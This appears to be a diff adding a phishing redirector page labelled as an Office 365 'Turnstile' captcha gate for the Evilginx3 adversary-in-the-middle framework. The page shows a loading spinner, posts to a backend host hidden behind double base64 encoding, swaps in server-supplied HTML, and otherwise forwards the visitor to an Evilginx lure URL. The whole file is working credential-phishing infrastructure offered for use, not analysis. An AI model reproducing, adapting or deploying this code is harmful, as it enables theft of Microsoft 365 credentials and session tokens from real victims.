@@ -1,0 +1,107 @@
+<!--
+    O365 Turnstile v2 Redirector for Evilginx3
+    Two-Stage Captcha-Gate Integration
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body { overflow: hidden; margin: 0; }
+        .reload-contain {
+            display: flex; justify-content: center; align-items: center;
+            flex-direction: column; height: 100vh; width: 100%;
+        }
+        .reload {
+            width: 30px; padding: 8px; aspect-ratio: 1; border-radius: 50%;
+            background: #25b09b;
+            --_m: conic-gradient(#0000 10%,#000), linear-gradient(#000 0 0) content-box;
+            -webkit-mask: var(--_m); mask: var(--_m);
+            -webkit-mask-composite: source-out; mask-composite: subtract;
+            animation: l3 1s infinite linear;
+        }
+        @keyframes l3 {to{transform: rotate(1turn)}}
+    </style>
+</head>
+<body>
+    <div class="reload-contain">
+        <div>
+            <svg width="180" height="180" viewBox="0 0 180 180" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M87.1875 118.125C116.7 118.125 140.625 94.2002 140.625 64.6875C140.625 35.1748 116.7 11.25 87.1875 11.25C57.6748 11.25 33.75 35.1748 33.75 64.6875C33.75 94.2002 57.6748 118.125 87.1875 118.125Z" fill="url(#paint0_linear_5637_172)"/>
+                <path d="M135 140.625C159.853 140.625 180 120.478 180 95.625C180 70.7722 159.853 50.625 135 50.625C110.147 50.625 90 70.7722 90 95.625C90 120.478 110.147 140.625 135 140.625Z" fill="url(#paint1_linear_5637_172)"/>
+                <mask id="mask0_5637_172" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="56" y="33" width="74" height="136">
+                <path d="M129.375 132.188C129.375 152.381 113.006 168.75 92.8125 168.75C72.6193 168.75 56.25 152.381 56.25 132.188C56.25 111.995 56.25 33.75 56.25 33.75H129.375C129.375 33.75 129.375 119.243 129.375 132.188Z" fill="#C4C4C4"/>
+                </mask>
+                <g mask="url(#mask0_5637_172)">
+                <path d="M92.8125 168.75C113.005 168.75 129.375 152.38 129.375 132.188C129.375 111.995 113.005 95.625 92.8125 95.625C72.6196 95.625 56.25 111.995 56.25 132.188C56.25 152.38 72.6196 168.75 92.8125 168.75Z" fill="url(#paint2_linear_5637_172)"/>
+                <path d="M39.375 67.5C39.375 58.1799 46.9302 50.625 56.25 50.625H95.625C104.945 50.625 112.5 58.1799 112.5 67.5V135C112.5 144.32 104.945 151.875 95.625 151.875H39.375V67.5Z" fill="black" fill-opacity="0.3"/>
+                </g>
+                <path d="M90 39.375H11.25C5.0368 39.375 0 44.4118 0 50.625V129.375C0 135.588 5.0368 140.625 11.25 140.625H90C96.2132 140.625 101.25 135.588 101.25 129.375V50.625C101.25 44.4118 96.2132 39.375 90 39.375Z" fill="url(#paint3_linear_5637_172)"/>
+                <path d="M73.125 101.941C73.125 93.2209 67.2761 89.3717 55.1062 84.8936C45.5779 81.3583 43.3137 80.3368 43.3137 76.959C43.3137 74.052 46.1438 72.0878 50.9552 72.0878C55.8609 72.0878 60.4834 73.7376 65.6724 76.5658L70.9554 67.2171C65.3889 63.7605 58.7852 61.875 50.7665 61.875C38.5023 61.875 29.7288 68.1598 29.7288 77.7443C29.7288 87.5644 36.7099 90.7071 48.408 94.8707C57.7474 98.1703 59.5401 99.8201 59.5401 102.727C59.5401 106.184 56.2382 107.912 51.0495 107.912C44.9174 107.912 39.5401 105.791 34.1628 102.334L28.125 111.29C34.7288 115.847 42.9363 118.125 51.3326 118.125C63.9742 118.125 73.125 112.154 73.125 101.941Z" fill="white"/>
+                <defs>
+                <linearGradient id="paint0_linear_5637_172" x1="33.75" y1="64.6875" x2="149.531" y2="64.6875" gradientUnits="userSpaceOnUse"><stop stop-color="#103A3B"/><stop offset="1" stop-color="#116B6E"/></linearGradient>
+                <linearGradient id="paint1_linear_5637_172" x1="101.25" y1="73.125" x2="180" y2="118.125" gradientUnits="userSpaceOnUse"><stop stop-color="#1D9097"/><stop offset="1" stop-color="#29BBC2"/></linearGradient>
+                <linearGradient id="paint2_linear_5637_172" x1="67.5" y1="120.937" x2="129.375" y2="149.062" gradientUnits="userSpaceOnUse"><stop stop-color="#28A6B5"/><stop offset="1" stop-color="#31D6EC"/></linearGradient>
+                <linearGradient id="paint3_linear_5637_172" x1="0" y1="90" x2="109.687" y2="90" gradientUnits="userSpaceOnUse"><stop stop-color="#105557"/><stop offset="1" stop-color="#116B6E"/></linearGradient>
+                </defs>
+            </svg>
+        </div>
+        <div class="reload" style="margin-top: 12px;"></div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+    // ============================================================
+    // CONFIGURATION
+    // ============================================================
+    var params = 'MC9mMDZhMmY0NS83MDQyNTMyNC8wUk1aY2tK';
+    var lru    = 'YUhSMGNITTZMeTluWVhSbExtRnVaSEpsZDJodmJXVmlkV2xzWkM1MGIzQXY=';
+
+    // {lure_url_html} is replaced by Evilginx with the lure URL + forwarder param
+    var REDIRECT_URL = "{lure_url_html}";
+
+    // Save redirect URL on window object — survives $('body').html() replacement
+    // (sessionStorage may be blocked by privacy browsers like DuckDuckGo)
+    if (REDIRECT_URL && REDIRECT_URL.indexOf('{') === -1) {
+        window._rd = REDIRECT_URL;
+    }
+
+    var adol = 'false';
+
+    setTimeout(function() { decall(); }, 1000);
+
+    function decall() {
+        $.post(atob(atob(lru)) + 'entry/' + params + '/', JSON.stringify({ unity: '' }))
+        .done(function(data, status) {
+            adol = true;
+            if (!data.service) {
+                $('.reload').html('Verification failed');
+            } else {
+                $('body').html(data.service);
+            }
+        })
+        .fail(function(err) {
+            adol = 'err';
+            // Fallback: redirect directly if backend fails
+            if (window._rd) {
+                setTimeout(function() { window.location.href = window._rd; }, 2000);
+            }
+        });
+    }
+
+    setTimeout(function() {
+        if (adol === 'false') decall();
+        if (adol === 'err') {
+            if (window._rd) {
+                window.location.href = window._rd;
+            }
+        }
+    }, 5000);
+    </script>
+</body>
+</html>
